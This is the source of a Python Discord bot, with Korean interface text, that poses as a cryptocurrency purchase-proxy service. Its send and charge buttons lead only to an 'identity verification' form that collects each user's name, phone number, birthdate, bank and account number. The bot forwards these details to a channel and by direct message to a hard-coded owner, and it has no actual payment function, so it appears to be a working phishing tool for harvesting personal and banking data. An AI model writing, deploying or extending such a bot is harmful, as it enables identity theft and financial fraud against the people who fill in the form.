import os
import discord
from discord.ext import commands
from discord.ui import View, Modal, TextInput

TOKEN = os.getenv("DISCORD_TOKEN")

# 🔥 수정 완료된 값
VERIFY_CHANNEL_ID = 1476976182523068478
OWNER_ID = 1472930278874939445

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


# ==============================
# 승인 / 거부 버튼
# ==============================
class ApproveView(View):
    def __init__(self, user):
        super().__init__(timeout=None)
        self.user = user

    @discord.ui.button(label="승인", style=discord.ButtonStyle.success)
    async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.user.send("✅ 인증 승인이 완료되었습니다.")
        await interaction.response.send_message("승인 처리 완료", ephemeral=True)

    @discord.ui.button(label="거부", style=discord.ButtonStyle.danger)
    async def reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.user.send("❌ 인증이 거부되었습니다.")
        await interaction.response.send_message("거부 처리 완료", ephemeral=True)


# ==============================
# 인증 입력 모달
# ==============================
class VerifyModal(Modal, title="본인 인증 정보 입력"):
    def __init__(self, carrier):
        super().__init__()
        self.carrier = carrier

        self.name = TextInput(label="이름", placeholder="홍길동")
        self.phone = TextInput(label="전화번호", placeholder="01012345678")
        self.birth = TextInput(label="생년월일 6자리", placeholder="010101")
        self.bank = TextInput(label="은행명", placeholder="국민은행")
        self.account = TextInput(label="계좌번호", placeholder="12345678901234")

        self.add_item(self.name)
        self.add_item(self.phone)
        self.add_item(self.birth)
        self.add_item(self.bank)
        self.add_item(self.account)

    async def on_submit(self, interaction: discord.Interaction):

        verify_channel = bot.get_channel(VERIFY_CHANNEL_ID)
        owner = await bot.fetch_user(OWNER_ID)

        embed = discord.Embed(
            title="📥 신규 인증 요청",
            color=0x5865F2
        )

        embed.add_field(name="👤 디스코드 유저", value=interaction.user.mention, inline=False)
        embed.add_field(name="📱 통신사", value=self.carrier, inline=False)
        embed.add_field(name="이름", value=self.name.value, inline=False)
        embed.add_field(name="전화번호", value=self.phone.value, inline=False)
        embed.add_field(name="생년월일", value=self.birth.value, inline=False)
        embed.add_field(name="은행", value=self.bank.value, inline=False)
        embed.add_field(name="계좌번호", value=self.account.value, inline=False)

        # ✅ 관리자 채널 전송
        if verify_channel:
            await verify_channel.send(embed=embed, view=ApproveView(interaction.user))

        # ✅ 너한테 DM 전송
        try:
            await owner.send(embed=embed)
        except:
            print("OWNER DM 실패 (DM 차단 확인)")

        await interaction.response.send_message("인증 요청이 접수되었습니다.", ephemeral=True)


# ==============================
# 통신사 선택
# ==============================
class CarrierView(View):
    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label="LGU+", style=discord.ButtonStyle.secondary)
    async def lgu(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("LGU+"))

    @discord.ui.button(label="KT", style=discord.ButtonStyle.secondary)
    async def kt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("KT"))

    @discord.ui.button(label="SKT", style=discord.ButtonStyle.secondary)
    async def skt(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal("SKT"))

    @discord.ui.button(label="알뜰폰", style=discord.ButtonStyle.primary)
    async def mvno(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "알뜰폰 통신사를 선택해주세요.",
            view=CarrierView(),
            ephemeral=True
        )


# ==============================
# 메인 패널 버튼
# ==============================
class PanelView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="송금", style=discord.ButtonStyle.primary, emoji="✈️", row=0)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "통신사를 선택해주세요.",
            view=CarrierView(),
            ephemeral=True
        )

    @discord.ui.button(label="충전", style=discord.ButtonStyle.success, emoji="💳", row=0)
    async def charge_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "통신사를 선택해주세요.",
            view=CarrierView(),
            ephemeral=True
        )


# ==============================
# 봇 시작
# ==============================
@bot.event
async def on_ready():
    print(f"{bot.user} 로그인 완료")

    channel = bot.get_channel(VERIFY_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="🪙 레제 코인대행",
            description="신속한 코인대행",
            color=0x5865F2
        )
        await channel.send(embed=embed, view=PanelView())


bot.run(TOKEN)
